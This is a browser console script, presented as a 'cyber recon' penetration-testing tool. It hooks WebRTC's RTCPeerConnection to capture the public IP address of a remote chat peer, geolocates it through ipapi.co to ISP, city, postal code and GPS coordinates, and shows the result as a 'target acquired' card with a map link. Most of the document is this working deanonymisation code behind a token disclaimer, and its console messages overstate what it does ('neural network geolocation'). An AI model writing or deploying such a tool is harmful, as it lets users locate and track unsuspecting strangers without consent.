(function() {
    console.clear();
    console.log("%c⚡ CYBER RECON SYSTEM v1 - INITIALIZING...", "color:#00ff99; font-size:18px; font-weight: bold;");
    console.log("%c[SYSTEM] Loading penetration testing modules...", "color:#1ec8ff;");
    console.log("%c[SYSTEM] Bypassing WebRTC security layers...", "color:#1ec8ff;");
    console.log("%c[SYSTEM] Neural network geolocation active...", "color:#1ec8ff;");
    console.log("%c[SUCCESS] All systems operational ✓", "color:#00ff99; font-weight: bold;");

    // Legal Disclaimer Popup
    const showLegalDisclaimer = () => {
        const overlay = document.createElement('div');
        overlay.style.position = 'fixed';
        overlay.style.top = '0';
        overlay.style.left = '0';
        overlay.style.width = '100%';
        overlay.style.height = '100%';
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
        overlay.style.zIndex = '999999';
        overlay.style.display = 'flex';
        overlay.style.justifyContent = 'center';
        overlay.style.alignItems = 'center';
        
        const popup = document.createElement('div');
        popup.style.backgroundColor = '#1a1a2e';
        popup.style.border = '3px solid #ff6b6b';
        popup.style.borderRadius = '15px';
        popup.style.padding = '30px';
        popup.style.maxWidth = '600px';
        popup.style.color = '#fff';
        popup.style.fontFamily = 'Arial, sans-serif';
        popup.style.boxShadow = '0 10px 30px rgba(255, 107, 107, 0.5)';
        
        popup.innerHTML = `
            <h2 style="color: #ff6b6b; text-align: center; margin-bottom: 20px;">⚠️ SECURITY RESEARCH AGREEMENT</h2>
            <div style="background-color: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; line-height: 1.6;">
                <p style="margin-bottom: 15px;"><strong style="color: #00ff99;">PENETRATION TESTING DISCLAIMER:</strong></p>
                <p style="margin-bottom: 10px;">This cybersecurity tool is designed for <strong>AUTHORIZED SECURITY RESEARCH ONLY</strong>.</p>
                <p style="margin-bottom: 10px;">By deploying this reconnaissance tool, you acknowledge:</p>
                <ul style="margin-left: 20px; margin-bottom: 10px;">
                    <li>You assume full responsibility for deployment and usage</li>
                    <li>Creator disclaims liability for unauthorized reconnaissance activities</li>
                    <li>Must comply with local cybersecurity laws and regulations</li>
                    <li>Malicious exploitation is strictly prohibited by law</li>
                    <li>Only use on networks/systems you are authorized to test</li>
                </ul>
                <p style="color: #ff6b6b; font-weight: bold; margin-top: 15px;">This tool is for ethical hackers and security professionals only.</p>
            </div>
            <div style="display: flex; gap: 10px; justify-content: center;">
                <button id="accept-disclaimer" style="padding: 15px 30px; background-color: #00ff99; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">✓ I AGREE - AUTHORIZE ACCESS</button>
                <button id="decline-disclaimer" style="padding: 15px 30px; background-color: #ff6b6b; color: #fff; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">✗ DECLINE</button>
            </div>
        `;
        
        overlay.appendChild(popup);
        document.body.appendChild(overlay);
        
        document.getElementById('accept-disclaimer').addEventListener('click', () => {
            document.body.removeChild(overlay);
            console.log("%c[AUTH] Security researcher authorization granted ✓", "color:#00ff99; font-weight: bold;");
            console.log("%c[SYSTEM] Initializing reconnaissance modules...", "color:#1ec8ff;");
            localStorage.setItem('fusionScannerDisclaimerAccepted', 'true');
        });
        
        document.getElementById('decline-disclaimer').addEventListener('click', () => {
            document.body.removeChild(overlay);
            console.log("%c[DENIED] Authorization declined - Terminating all systems", "color:#ff6b6b; font-weight: bold;");
            alert('⚠️ SYSTEM LOCKED - Authorization required for recon operations.');
            throw new Error('Security authorization declined');
        });
    };
    
    // Check if disclaimer was already accepted
    if (localStorage.getItem('fusionScannerDisclaimerAccepted') !== 'true') {
        showLegalDisclaimer();
    }

    // Add custom styles
    const styleSheet = document.createElement('style');
    styleSheet.textContent = `
        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px rgba(0, 255, 153, 0.6); }
            50% { box-shadow: 0 0 40px rgba(0, 255, 153, 0.9); }
        }
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        .fusion-scrollbar::-webkit-scrollbar {
            width: 8px;
        }
        .fusion-scrollbar::-webkit-scrollbar-track {
            background: #16213e;
            border-radius: 10px;
        }
        .fusion-scrollbar::-webkit-scrollbar-thumb {
            background: #00ff99;
            border-radius: 10px;
        }
        .fusion-scrollbar::-webkit-scrollbar-thumb:hover {
            background: #00cc7a;
        }
    `;
    document.head.appendChild(styleSheet);

    // Create main scanner button
    const scannerButton = document.createElement('button');
    scannerButton.id = 'fusion-scanner-btn';
    scannerButton.innerHTML = '<span style="font-size: 24px;">⚡</span><br><span style="font-size: 11px; letter-spacing: 2px;">RECON</span><br><span style="font-size: 8px; opacity: 0.7;">v3.7.2</span>';
    scannerButton.style.position = 'fixed';
    scannerButton.style.top = '20px';
    scannerButton.style.right = '20px';
    scannerButton.style.padding = '15px 20px';
    scannerButton.style.backgroundColor = '#00ff99';
    scannerButton.style.color = '#000';
    scannerButton.style.border = '3px solid #000';
    scannerButton.style.borderRadius = '15px';
    scannerButton.style.fontSize = '14px';
    scannerButton.style.fontWeight = 'bold';
    scannerButton.style.cursor = 'pointer';
    scannerButton.style.zIndex = '99999';
    scannerButton.style.boxShadow = '0 4px 12px rgba(0, 255, 153, 0.6)';
    scannerButton.style.transition = 'all 0.3s';
    scannerButton.style.animation = 'pulse 2s infinite';
    scannerButton.style.textAlign = 'center';
    scannerButton.style.lineHeight = '1.2';
    
    scannerButton.onmouseover = function() {
        scannerButton.style.backgroundColor = '#00cc7a';
        scannerButton.style.transform = 'scale(1.1) rotate(5deg)';
    };
    scannerButton.onmouseout = function() {
        scannerButton.style.backgroundColor = '#00ff99';
        scannerButton.style.transform = 'scale(1) rotate(0deg)';
    };
    
    document.body.appendChild(scannerButton);

    // Create results container (hidden initially)
    const resultsContainer = document.createElement('div');
    resultsContainer.id = 'fusion-results';
    resultsContainer.className = 'fusion-scrollbar';
    resultsContainer.style.position = 'fixed';
    resultsContainer.style.top = '120px';
    resultsContainer.style.right = '20px';
    resultsContainer.style.width = '480px';
    resultsContainer.style.maxHeight = '70vh';
    resultsContainer.style.overflowY = 'auto';
    resultsContainer.style.background = 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)';
    resultsContainer.style.border = '3px solid #00ff99';
    resultsContainer.style.borderRadius = '20px';
    resultsContainer.style.padding = '25px';
    resultsContainer.style.zIndex = '99998';
    resultsContainer.style.fontFamily = "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif";
    resultsContainer.style.fontSize = '13px';
    resultsContainer.style.boxShadow = '0 20px 60px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 255, 153, 0.3)';
    resultsContainer.style.color = '#fff';
    resultsContainer.style.display = 'none';
    resultsContainer.style.backdropFilter = 'blur(10px)';
    resultsContainer.style.animation = 'slideIn 0.5s ease-out';
    
    resultsContainer.innerHTML = `
        <div id="drag-handle" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; cursor: move; border-bottom: 3px solid #00ff99; padding-bottom: 15px; background: linear-gradient(90deg, rgba(0,255,153,0.1) 0%, rgba(30,200,255,0.1) 100%); padding: 15px; border-radius: 10px; margin: -10px -10px 25px -10px;">
            <div>
                <h3 style="margin: 0; color: #00ff99; font-size: 22px; text-shadow: 0 0 10px rgba(0, 255, 153, 0.5); letter-spacing: 3px; font-family: 'Courier New', monospace;">⚡ CYBER RECONNAISSANCE</h3>
                <div style="font-size: 10px; color: rgba(0,255,153,0.6); margin-top: 3px; letter-spacing: 1px;">PENETRATION TESTING MODULE v3.7.2</div>
            </div>
            <div style="display: flex; gap: 8px;">
                <button id="minimize-results" title="Minimize" style="width: 35px; height: 35px; border: none; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px; cursor: pointer; font-size: 18px; transition: all 0.3s; display: flex; align-items: center; justify-content: center;">−</button>
                <button id="clear-results" title="Clear All" style="width: 35px; height: 35px; border: none; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; border-radius: 8px; cursor: pointer; font-size: 18px; transition: all 0.3s; display: flex; align-items: center; justify-content: center;">🗑️</button>
                <button id="close-results" title="Close" style="width: 35px; height: 35px; border: none; background: linear-gradient(135deg, #fa709a 0%, #fee140 100%); color: white; border-radius: 8px; cursor: pointer; font-size: 18px; transition: all 0.3s; display: flex; align-items: center; justify-content: center;">✖</button>
            </div>
        </div>
        <div id="stats-bar" style="display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;">
            <div style="flex: 1; min-width: 130px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 15px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">
                <div style="font-size: 24px; font-weight: bold; color: #fff; font-family: 'Courier New', monospace;">0</div>
                <div style="font-size: 10px; color: rgba(255,255,255,0.8); margin-top: 5px; letter-spacing: 1px;">TARGETS ACQUIRED</div>
            </div>
            <div style="flex: 1; min-width: 130px; background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); padding: 15px; border-radius: 12px; text-align: center; box-shadow: 0 4px 15px rgba(245, 87, 108, 0.4);">
                <div style="font-size: 24px; font-weight: bold; color: #fff; font-family: 'Courier New', monospace;" id="scan-status">STANDBY</div>
                <div style="font-size: 10px; color: rgba(255,255,255,0.8); margin-top: 5px; letter-spacing: 1px;">SYSTEM STATUS</div>
            </div>
        </div>
        <div id="device-info" style="margin-bottom: 20px; padding: 20px; background: rgba(30, 200, 255, 0.1); border-radius: 15px; border: 2px solid #1ec8ff; box-shadow: 0 4px 20px rgba(30, 200, 255, 0.2); backdrop-filter: blur(5px);">
            <h4 style="margin: 0 0 15px 0; color: #1ec8ff; font-size: 16px; display: flex; align-items: center; gap: 10px; text-shadow: 0 0 10px rgba(30, 200, 255, 0.5); font-family: 'Courier New', monospace; letter-spacing: 2px;"><span style="font-size: 20px;">💻</span> TARGET FINGERPRINT</h4>
            <div style="font-size: 9px; color: rgba(30,200,255,0.6); margin-top: -10px; margin-bottom: 10px;">Device & Browser Intelligence</div>
            <div id="device-data"></div>
        </div>
        <div id="ip-section" style="padding: 20px; background: rgba(255, 107, 107, 0.1); border-radius: 15px; border: 2px solid #ff6b6b; box-shadow: 0 4px 20px rgba(255, 107, 107, 0.2); backdrop-filter: blur(5px);">
            <h4 style="margin: 0 0 15px 0; color: #ff6b6b; font-size: 16px; display: flex; align-items: center; gap: 10px; text-shadow: 0 0 10px rgba(255, 107, 107, 0.5); font-family: 'Courier New', monospace; letter-spacing: 2px;"><span style="font-size: 20px;">🎯</span> NETWORK INTELLIGENCE</h4>
            <div style="font-size: 9px; color: rgba(255,107,107,0.6); margin-top: -10px; margin-bottom: 10px;">WebRTC Leak Exploitation & Geolocation</div>
            <div id="ip-addresses"></div>
        </div>
    `;
    
    document.body.appendChild(resultsContainer);

    // Make container draggable
    function makeDraggable(element, handle) {
        handle = handle || element;
        let posX = 0, posY = 0, mouseX = 0, mouseY = 0;

        handle.onmousedown = dragMouseDown;

        function dragMouseDown(e) {
            e.preventDefault();
            mouseX = e.clientX;
            mouseY = e.clientY;
            document.onmouseup = closeDragElement;
            document.onmousemove = elementDrag;
        }

        function elementDrag(e) {
            e.preventDefault();
            posX = mouseX - e.clientX;
            posY = mouseY - e.clientY;
            mouseX = e.clientX;
            mouseY = e.clientY;
            element.style.top = (element.offsetTop - posY) + "px";
            element.style.left = (element.offsetLeft - posX) + "px";
        }

        function closeDragElement() {
            document.onmouseup = null;
            document.onmousemove = null;
        }
    }

    makeDraggable(resultsContainer, document.getElementById('drag-handle'));

    // Event listeners for buttons
    document.getElementById('minimize-results').addEventListener('click', () => {
        const deviceInfo = document.getElementById('device-info');
        const ipSection = document.getElementById('ip-section');
        const statsBar = document.getElementById('stats-bar');
        const isMinimized = deviceInfo.style.display === 'none';
        
        if (isMinimized) {
            deviceInfo.style.display = 'block';
            ipSection.style.display = 'block';
            statsBar.style.display = 'flex';
            document.getElementById('minimize-results').textContent = '−';
        } else {
            deviceInfo.style.display = 'none';
            ipSection.style.display = 'none';
            statsBar.style.display = 'none';
            document.getElementById('minimize-results').textContent = '+';
        }
    });

    document.getElementById('clear-results').addEventListener('click', () => {
        if (confirm('Clear all scan results?')) {
            document.getElementById('ip-addresses').innerHTML = '';
            document.getElementById('device-data').innerHTML = '';
            updateIPCount();
        }
    });

    document.getElementById('close-results').addEventListener('click', () => {
        resultsContainer.style.display = 'none';
    });

    // Function to update IP count
    function updateIPCount() {
        const ipCount = document.getElementById('ip-addresses').children.length;
        const statsDiv = document.querySelector('#stats-bar > div:first-child > div:first-child');
        if (statsDiv) statsDiv.textContent = ipCount;
    }

    // Function to scan device information
    async function scanDeviceInfo() {
        const info = {};
        const deviceDataDiv = document.getElementById('device-data');
        deviceDataDiv.innerHTML = '<p style="color: #00ff99; font-family: \'Courier New\', monospace; font-size: 12px; animation: fadeIn 0.3s;">⚡ Penetrating target environment...<br><span style="font-size: 10px; color: rgba(0,255,153,0.7);">→ Extracting browser fingerprint<br>→ Analyzing hardware configuration<br>→ Mapping network topology</span></p>';

        // Navigateur / OS
        info.browser = navigator.userAgent;
        info.platform = navigator.platform;

        // Langue
        info.language = navigator.language;

        // Heure locale
        info.time = new Date().toLocaleTimeString();
        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        // Résolution d'écran
        info.screen = `${window.screen.width} x ${window.screen.height}`;
        info.devicePixelRatio = window.devicePixelRatio;

        // Cœurs CPU
        info.cpuCores = navigator.hardwareConcurrency;

        // GPU (WebGL)
        try {
            let canvas = document.createElement('canvas');
            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
        } catch {
            info.gpu = "Unknown GPU";
        }

        // Batterie
        try {
            let battery = await navigator.getBattery();
            info.battery = Math.round(battery.level * 100) + "%";
            info.charging = battery.charging ? "Yes" : "No";
        } catch {
            info.battery = "Unavailable";
            info.charging = "Unavailable";
        }

        // Vitesse réseau (Network Information API)
        if (navigator.connection) {
            info.networkType = navigator.connection.effectiveType;
            info.downlink = navigator.connection.downlink + " Mb/s";
        } else {
            info.networkType = "Unavailable";
            info.downlink = "Unavailable";
        }

        // Display device info with animation
        deviceDataDiv.innerHTML = '';
        const keys = Object.entries(info);
        let i = 0;

        function displayNextInfo() {
            if (i < keys.length) {
                const [k, v] = keys[i];
                const infoLine = document.createElement('div');
                infoLine.style.marginBottom = '10px';
                infoLine.style.padding = '12px';
                infoLine.style.background = 'linear-gradient(135deg, rgba(30, 200, 255, 0.15) 0%, rgba(30, 200, 255, 0.05) 100%)';
                infoLine.style.borderRadius = '8px';
                infoLine.style.borderLeft = '3px solid #1ec8ff';
                infoLine.style.transition = 'transform 0.2s';
                infoLine.style.animation = 'fadeIn 0.3s ease-in';
                infoLine.onmouseover = () => infoLine.style.transform = 'translateX(5px)';
                infoLine.onmouseout = () => infoLine.style.transform = 'translateX(0)';
                infoLine.innerHTML = `<span style="color: #1ec8ff; font-weight: bold; text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">${k}:</span><br><span style="color: #fff; font-size: 13px; word-break: break-word;">${typeof v === 'object' ? JSON.stringify(v) : v}</span>`;
                deviceDataDiv.appendChild(infoLine);
                console.log(`%c[RECON] ${k}: %c${JSON.stringify(v)}`, "color:#1ec8ff;", "color:#ffffff;");
                i++;
                setTimeout(displayNextInfo, 150);
            } else {
                console.log("%c[SUCCESS] Target fingerprint acquired ✓", "color:#00ff99; font-size:16px; font-weight: bold;");
                document.getElementById('scan-status').textContent = 'ACTIVE';
            }
        }

        displayNextInfo();
    }

    // Setup IP address detection
    function setupIPDetection() {
        window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;

        window.RTCPeerConnection = function(...args) {
            const pc = new window.oRTCPeerConnection(...args);

            pc.oaddIceCandidate = pc.addIceCandidate;

            pc.addIceCandidate = function(iceCandidate, ...rest) {
                const fields = iceCandidate.candidate.split(' ');

                if (fields[7] === 'srflx') {
                    const ipAddress = fields[4];
                    const currentTime = new Date().toLocaleTimeString();
                    console.group('%c[BREACH] WebRTC Leak Detected', 'color:#ff6b6b; font-weight: bold;');
                    console.log('%c[TARGET] IP Address: %c' + ipAddress, 'color:#ff6b6b;', 'color:#00ff99; font-weight: bold;');
                    console.log('%c[STATUS] Initiating deep geolocation scan...', 'color:#1ec8ff;');
                    console.groupEnd();

                    // Fetch ISP and detailed location information
                    fetch(`https://ipapi.co/${ipAddress}/json/`)
                        .then(response => response.json())
                        .then(data => {
                            const ispInfo = data.org || 'Unknown ISP';
                            const cityInfo = data.city || 'Unknown City';
                            const countryInfo = data.country_name || 'Unknown Country';
                            const regionInfo = data.region || 'Unknown Region';
                            const postalCode = data.postal || 'N/A';
                            const latitude = data.latitude || 'N/A';
                            const longitude = data.longitude || 'N/A';
                            const timezone = data.timezone || 'N/A';
                            const currency = data.currency || 'N/A';
                            const languages = data.languages || 'N/A';
                            const asn = data.asn || 'N/A';
                            
                            // Créer le lien Google Maps
                            const mapsLink = (latitude !== 'N/A' && longitude !== 'N/A') 
                                ? `https://www.google.com/maps?q=${latitude},${longitude}` 
                                : '#';
                            
                            const ipList = document.getElementById('ip-addresses');
                            const ipItem = document.createElement('div');
                            ipItem.className = 'ip-item';
                            ipItem.style.background = 'linear-gradient(135deg, rgba(255, 107, 107, 0.2) 0%, rgba(255, 107, 107, 0.05) 100%)';
                            ipItem.style.border = '2px solid #ff6b6b';
                            ipItem.style.padding = '18px';
                            ipItem.style.marginBottom = '15px';
                            ipItem.style.borderRadius = '12px';
                            ipItem.style.transition = 'all 0.3s ease';
                            ipItem.style.cursor = 'pointer';
                            ipItem.style.boxShadow = '0 4px 15px rgba(255, 107, 107, 0.2)';
                            ipItem.style.animation = 'slideIn 0.4s ease-out';
                            
                            ipItem.onmouseover = function() {
                                ipItem.style.transform = 'translateY(-5px) scale(1.02)';
                                ipItem.style.boxShadow = '0 8px 25px rgba(255, 107, 107, 0.4)';
                                ipItem.style.borderColor = '#00ff99';
                            };
                            ipItem.onmouseout = function() {
                                ipItem.style.transform = 'translateY(0) scale(1)';
                                ipItem.style.boxShadow = '0 4px 15px rgba(255, 107, 107, 0.2)';
                                ipItem.style.borderColor = '#ff6b6b';
                            };
                            
                            ipItem.innerHTML = `
                                <div style="background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid rgba(0,255,153,0.3);">
                                    <div style="font-size: 10px; color: rgba(255,107,107,0.8); margin-bottom: 5px; letter-spacing: 2px; font-family: 'Courier New', monospace;">⚡ TARGET ACQUIRED</div>
                                    <div style="font-size: 22px; color: #00ff99; font-weight: bold; margin-bottom: 8px; text-shadow: 0 0 10px rgba(0, 255, 153, 0.5); font-family: 'Courier New', monospace;">${ipAddress}</div>
                                    <div style="font-size: 10px; color: rgba(255,255,255,0.6); font-family: 'Courier New', monospace;">⏱️ Breach Time: ${currentTime}</div>
                                </div>
                                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #1ec8ff;">
                                        <div style="font-size: 10px; color: #1ec8ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">📡 ISP</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${ispInfo}</div>
                                    </div>
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #ff6b6b;">
                                        <div style="font-size: 10px; color: #ff6b6b; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">🔢 ASN</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${asn}</div>
                                    </div>
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #feca57;">
                                        <div style="font-size: 10px; color: #feca57; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">🏙️ City</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${cityInfo}</div>
                                    </div>
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #a29bfe;">
                                        <div style="font-size: 10px; color: #a29bfe; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">📍 Region</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${regionInfo}</div>
                                    </div>
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #fd79a8;">
                                        <div style="font-size: 10px; color: #fd79a8; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">🌍 Country</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${countryInfo}</div>
                                    </div>
                                    <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; border-left: 3px solid #74b9ff;">
                                        <div style="font-size: 10px; color: #74b9ff; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">📮 Postal</div>
                                        <div style="font-size: 12px; color: #fff; font-weight: bold;">${postalCode}</div>
                                    </div>
                                </div>
                                <div style="background: rgba(0,0,0,0.2); padding: 10px; border-radius: 6px; margin-bottom: 15px; border-left: 3px solid #00ff99;">
                                    <div style="font-size: 10px; color: #00ff99; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px;">🧭 GPS Coordinates</div>
                                    <div style="font-size: 12px; color: #fff; font-weight: bold;">${latitude}, ${longitude}</div>
                                </div>
                                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-bottom: 15px; font-size: 11px;">
                                    <div><span style="color: #888;">🕐</span> <span style="color: #fff;">${timezone}</span></div>
                                    <div><span style="color: #888;">💰</span> <span style="color: #fff;">${currency}</span></div>
                                    <div><span style="color: #888;">🗣️</span> <span style="color: #fff;">${languages}</span></div>
                                </div>
                                <div style="display: flex; gap: 8px;">
                                    <button class="copy-ip-btn" style="flex: 1; padding: 12px; border: none; background: linear-gradient(135deg, #00ff99 0%, #00cc7a 100%); color: #000; border-radius: 8px; cursor: pointer; font-weight: bold; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0, 255, 153, 0.3); font-family: 'Courier New', monospace; font-size: 11px; letter-spacing: 1px;">📋 COPY TARGET</button>
                                    <a href="${mapsLink}" target="_blank" style="flex: 1; padding: 12px; border: none; background: linear-gradient(135deg, #4285f4 0%, #0d47a1 100%); color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; text-align: center; text-decoration: none; display: block; transition: all 0.3s; box-shadow: 0 4px 15px rgba(66, 133, 244, 0.3); font-family: 'Courier New', monospace; font-size: 11px; letter-spacing: 1px;">🎯 GEOLOCATE</a>
                                </div>
                            `;
                            
                            ipList.appendChild(ipItem);
                            updateIPCount();

                            // Add copy functionality
                            const copyButton = ipItem.querySelector('.copy-ip-btn');
                            copyButton.addEventListener('click', (e) => {
                                e.stopPropagation();
                                navigator.clipboard.writeText(ipAddress).then(() => {
                                    copyButton.innerHTML = '✅ COPIED!';
                                    copyButton.style.background = 'linear-gradient(135deg, #28a745 0%, #20c997 100%)';
                                    setTimeout(() => {
                                        copyButton.innerHTML = '📋 COPY TARGET';
                                        copyButton.style.background = 'linear-gradient(135deg, #00ff99 0%, #00cc7a 100%)';
                                    }, 2000);
                                });
                            });
                            
                            // Add hover effects to buttons
                            copyButton.onmouseover = () => copyButton.style.transform = 'scale(1.05)';
                            copyButton.onmouseout = () => copyButton.style.transform = 'scale(1)';
                            
                            const mapsButton = ipItem.querySelector('a[href*="maps"]');
                            mapsButton.onmouseover = () => mapsButton.style.transform = 'scale(1.05)';
                            mapsButton.onmouseout = () => mapsButton.style.transform = 'scale(1)';
                        })
                        .catch(error => console.error('Error fetching IP information:', error));
                }

                return pc.oaddIceCandidate(iceCandidate, ...rest);
            }

            return pc;
        }
    }

    // Main scanner button click event
    scannerButton.addEventListener('click', async () => {
        console.log("%c═══════════════════════════════════════", "color:#00ff99;");
        console.log("%c⚡ INITIATING CYBER RECONNAISSANCE", "color:#00ff99; font-size:18px; font-weight: bold;");
        console.log("%c═══════════════════════════════════════", "color:#00ff99;");
        console.log("%c[PHASE 1] Deploying WebRTC exploitation...", "color:#1ec8ff;");
        console.log("%c[PHASE 2] Activating neural network geolocation...", "color:#1ec8ff;");
        console.log("%c[PHASE 3] Extracting target fingerprint...", "color:#1ec8ff;");
        
        // Show results container
        resultsContainer.style.display = 'block';
        
        // Update button
        scannerButton.innerHTML = '<span style="font-size: 24px;">⚡</span><br><span style="font-size: 11px; letter-spacing: 2px;">ACTIVE</span><br><span style="font-size: 8px; opacity: 0.7;">BREACHING...</span>';
        scannerButton.style.background = 'linear-gradient(135deg, #ff6b6b 0%, #ff8787 100%)';
        scannerButton.style.animation = 'pulse 0.5s infinite';
        
        // Scan device information
        await scanDeviceInfo();
        
        // Setup IP detection
        setupIPDetection();
        
        // Update button to active state
        setTimeout(() => {
            scannerButton.innerHTML = '<span style="font-size: 24px;">✓</span><br><span style="font-size: 11px; letter-spacing: 2px;">ONLINE</span><br><span style="font-size: 8px; opacity: 0.7;">MONITORING</span>';
            scannerButton.style.background = 'linear-gradient(135deg, #00ff99 0%, #00cc7a 100%)';
            scannerButton.style.animation = 'pulse 2s infinite';
        }, 2000);
        
        console.log("%c[SUCCESS] All reconnaissance systems online ✓", "color:#00ff99; font-size:14px; font-weight: bold;");
        console.log("%c[MONITOR] Passive WebRTC interception active...", "color:#1ec8ff;");
        console.log("%c[MONITOR] Awaiting network connections...", "color:#1ec8ff;");
        console.log("%c═══════════════════════════════════════", "color:#00ff99;");
    });

    console.log("%c═══════════════════════════════════════", "color:#00ff99;");
    console.log("%c⚡ CYBER RECON SYSTEM READY", "color:#00ff99; font-size:16px; font-weight: bold;");
    console.log("%c[INFO] Click RECON button to initiate penetration testing", "color:#1ec8ff;");
    console.log("%c[INFO] Developed by security researcher", "color:#1ec8ff;");
    console.log("%c═══════════════════════════════════════", "color:#00ff99;");
})();
